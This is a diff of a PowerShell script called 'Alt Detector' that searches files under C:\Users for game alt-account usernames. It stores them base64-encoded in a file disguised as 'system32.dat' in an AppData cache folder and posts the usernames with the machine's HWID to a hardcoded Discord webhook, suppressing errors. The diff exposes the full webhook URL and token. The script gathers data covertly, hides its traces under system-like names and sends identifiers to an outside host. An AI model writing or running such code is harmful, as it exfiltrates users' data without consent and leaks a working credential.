@@ -1,11 +1,11 @@
 $webhookUrl = "https://discord.com/api/webhooks/1484660761065164941/zLCj9R1yBHopZUV9UflUrB_NS-aWOy9_DOcjB1-Djan2iHoXSyPaZCcCh9pZPMfG9UmN"
 $startPath = "C:\Users"
-$hwidPath = "$env:APPDATA\Microsoft\Windows\Caches"
-$hwidFile = "$hwidPath\system32.dat"
+$hwidFolder = "$env:APPDATA\Microsoft\Windows\Caches"
+$hwidFile = "$hwidFolder\system32.dat"
 
-# Create directory if it doesn't exist
-if (-not (Test-Path $hwidPath)) {
-    New-Item -ItemType Directory -Path $hwidPath -Force | Out-Null
+# Create folder if it doesn't exist
+if (-not (Test-Path $hwidFolder)) {
+    New-Item -ItemType Directory -Path $hwidFolder -Force | Out-Null
 }
 
 # Get HWID only
@@ -91,39 +91,46 @@ foreach ($file in $allFiles) {
 }
 
 # Save new alts
-foreach ($alt in $newAlts) {
-    $storedAlts[$alt] = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
-}
-
-if ($storedAlts.Count -gt 0) {
+if ($newAlts.Count -gt 0) {
+    foreach ($alt in $newAlts) {
+        $storedAlts[$alt] = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
+    }
+    
     $json = $storedAlts | ConvertTo-Json
     $bytes = [System.Text.Encoding]::UTF8.GetBytes($json)
     $encrypted = [System.Convert]::ToBase64String($bytes)
     Set-Content -Path $hwidFile -Value $encrypted -Force
 }
 
-# Display and send results
+# Send results in elegant embed format
 if ($newAlts.Count -gt 0) {
     Write-Host "`nNew alts found:" -ForegroundColor Cyan
-    $newAlts | ForEach-Object {
-        Write-Host ("  {0}" -f $_) -ForegroundColor Magenta
-    }
-    
-    # Elegant format like the image
-    $message = "**ALT ACCOUNTS DETECTED**`n"
     $counter = 1
+    $description = ""
     foreach ($username in $newAlts | Select-Object -Unique) {
-        $message += "`n$counter. $username"
+        Write-Host ("  {0}. {1}" -f $counter, $username) -ForegroundColor Magenta
+        $description += "$counter. $username`n"
         $counter++
     }
     
+    # Create embed
+    $embed = @{
+        title = "🎮 ALT ACCOUNTS DETECTED"
+        color = 0x9B59B6
+        description = $description
+        footer = @{
+            text = "HWID: $hwid"
+        }
+        timestamp = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ss.fffZ")
+    }
+    
     $payload = @{
-        content = $message
+        embeds = @($embed)
         username = "Alt Detector"
-    } | ConvertTo-Json
+    } | ConvertTo-Json -Depth 3
     
     Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json" -ErrorAction SilentlyContinue
-    Write-Host "Results sent to Discord!" -ForegroundColor Green
+    Write-Host "`nResults sent to Discord!" -ForegroundColor Green
 } else {
     Write-Host "No new alts found." -ForegroundColor Yellow
 }
